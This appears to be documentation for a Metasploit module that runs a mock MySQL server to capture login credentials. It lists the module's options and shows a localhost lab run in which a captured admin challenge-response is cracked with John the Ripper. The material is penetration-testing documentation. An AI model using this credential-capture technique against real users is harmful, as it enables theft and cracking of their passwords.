This module creates a mock MySQL server which accepts credentials.  Upon receiving a login attempt, an `ERROR 1045 (2800): Access denied` error is thrown.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/server/capture/mysql```
  3. Do: ```run```

## Options

  **CHALLENGE**

  The MySQL 16 byte challenge used in the authentication.  Default is `112233445566778899AABBCCDDEEFF1122334455`.

  **JOHNPWFILE**

  Write a file containing a John the Ripper format for cracking the credentials.  Default is ``.

  **CAINPWFILE**

  Write a file containing a Cain & Abel format for cracking the credentials.  Default is ``.

  **SRVVERSION**

  The MySQL version to print in the login banner.  Default is `5.5.16`.

  **SSL**

  Boolean if SSL should be used.  Default is `False`.

  **SSLCert**

  File path to a combined Private Key and Certificate file.  If not provided, a certificate will be automatically
  generated.  Default is ``.

## Scenarios

### MySQL with MySQL Client and JTR Cracking

Server:

```
msf5 > use auxiliary/server/capture/mysql 
msf5 auxiliary(server/capture/mysql) > set johnpwfile /tmp/mysql.logins
johnpwfile => /tmp/mysql.logins
msf5 auxiliary(server/capture/mysql) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/mysql) > 
[*] Started service listener on 0.0.0.0:3306 
[*] Server started.
[+] 127.0.0.1:59604 - User: admin; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 46677c2d9cac93da328c4321060c125db759925e
```

Client:

```
root@kali:~# mysql -u admin -ppassword1 -h 127.0.0.1
ERROR 1045 (28000): Access denied for user 'admin'@'127.0.0.1' (using password: YES)
```

JTR:

```
root@kali:~# john /tmp/mysql.logins_mysqlna 
Using default input encoding: UTF-8
Loaded 1 password hashes with no different salts (mysqlna, MySQL Network Authentication [SHA1 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (admin)
1g 0:00:00:00 DONE 2/3 (2018-11-08 21:05) 20.00g/s 16800p/s 16800c/s 16800C/s password1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
